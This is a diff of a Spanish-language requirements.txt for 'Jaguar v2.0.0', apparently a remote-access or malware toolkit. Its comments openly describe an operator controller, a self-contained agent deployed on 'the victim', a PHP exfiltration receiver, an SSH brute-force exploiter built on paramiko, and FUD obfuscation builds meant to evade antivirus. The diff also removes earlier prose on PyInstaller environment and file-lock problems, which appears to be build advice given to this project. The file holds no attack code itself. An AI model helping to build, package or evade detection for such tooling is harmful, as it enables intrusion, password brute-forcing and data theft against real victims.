@@ -1,35 +1,41 @@
-# --- Controlador (máquina del operador) ---
+# ============================================================================
+#  Jaguar v2.0.0 — requirements del CONTROLADOR (tu máquina de operador)
+#  El AGENTE (agente.py) no requiere nada de aquí: es autocontenido
+#  (stdlib + PIL/cv2 opcionales, que ya van embebidos en el .exe del builder).
+#  El receptor de exfiltración es PHP, no pip.
+#
+#  Instalación:
+#     python -m venv .venv
+#     .venv\Scripts\activate
+#     pip install -r requirements.txt
+# ============================================================================
+
+# --- Controlador (UI / red / escáner / geo) ---
 PyQt6>=6.6
 requests>=2.31
 msgpack>=1.0
 psutil>=5.9
 
-# --- Builder / empaquetado ---
+# --- Explotadores nativos ---
+# NUEVO: explotadores.explotar_ssh() ya lo importaba pero faltaba aquí.
+# Sin esto, el módulo devuelve "paramiko no instalado" en vez de hacer el brute-force.
+paramiko>=3.4
+
+# --- Builder / empaquetado del payload ---
 pyinstaller>=6.12
 pillow>=10.0
 opencv-python>=4.8
 numpy>=1.26
 pywin32>=306 ; sys_platform == "win32"
 
-# --- FUD (build avanzado) ---
+# --- Build avanzado (FUD / ofuscación) ---
 nuitka>=2.4
 ordered-set>=4.1
 zstandard>=0.22
 pyarmor>=9.0
 
-
-Análisis Técnico: El comportamiento de los empaquetadores en Windows
-
-
-1. Aislamiento del Entorno en Procesos Hijos (_MEIPASS y PYINSTALLER_RESET_ENVIRONMENT)
-
-En aplicaciones convencionales (por ejemplo, herramientas de automatización que lanzan scripts secundarios), el comportamiento que describes en tu comentario (FIX 1) es un desafío arquitectónico documentado:
-• El mecanismo de PyInstaller: Cuando un ejecutable --onefile se inicia, el bootloader en C crea un directorio temporal (generalmente _MEIxxxxxx en %TEMP%) y define la variable de entorno sys._MEIPASS (y internamente _MEIPASS2 en el entorno del sistema) apuntando a esa ruta.
-• El problema de la herencia: Si ese ejecutable utiliza subprocess.Popen para lanzar cualquier otro proceso de Python, el proceso hijo heredará el diccionario os.environ del padre. Si el hijo es otro binario empaquetado, intentará reutilizar la carpeta temporal especificada en las variables heredadas en lugar de extraer la suya propia. Si el padre termina, borra su carpeta temporal y el hijo queda "huérfano" de librerías, provocando un fallo inmediato.
-• La solución estándar en ingeniería: Para evitar esto en software legítimo, PyInstaller introdujo formalmente la variable PYINSTALLER_RESET_ENVIRONMENT. Cuando se establece en 1, el cargador sabe que debe reconfigurar las variables de entorno de Python a sus valores globales del sistema antes de inicializar el intérprete, garantizando que el proceso hijo opere en un espacio de memoria y disco completamente aislado.
-
-2. Gestión de Bloqueos de Archivos en Windows (WinError 32: Acceso Denegado)
-
-El error clásico PermissionError: [WinError 32] ocurre porque el sistema de archivos NTFS de Windows, a diferencia de los sistemas basados en Unix (como Linux o macOS), implementa un bloqueo obligatorio de archivos (mandatory file locking) en binarios que están en ejecución o abiertos por un manejador de archivos (handle):
-• Carpeta de trabajo única (FIX 2): El enfoque de utilizar nombres aleatorios o sufijos de tiempo (como tu método _sello()) es una práctica estándar en herramientas de desarrollo para evitar colisiones cuando se ejecutan múltiples compilaciones concurrentes en un mismo servidor (por ejemplo, en agentes de Jenkins o GitHub Actions).
-• Liberación de recursos: Si un antivirus está analizando el archivo recién generado, el motor de búsqueda mantendrá un handle abierto sobre el binario. Intentar borrar la carpeta de compilación inmediatamente después de terminar el proceso fallará con WinError 32 porque el analizador aún no ha liberado el archivo, requiriendo rutinas de reintento con pausas dinámicas (time.sleep) como la que implementa tu función _rmtree_robusto.
+# --- Opcional: acelerador criptográfico ---
+# El agente usa AES/3DES en Python puro para no depender de nada en la víctima.
+# Si además quieres 'cryptography' en el controlador (scripts propios, tests),
+# descomenta. Es OPCIONAL: nada del flujo depende de ello.
+cryptography>=42.0
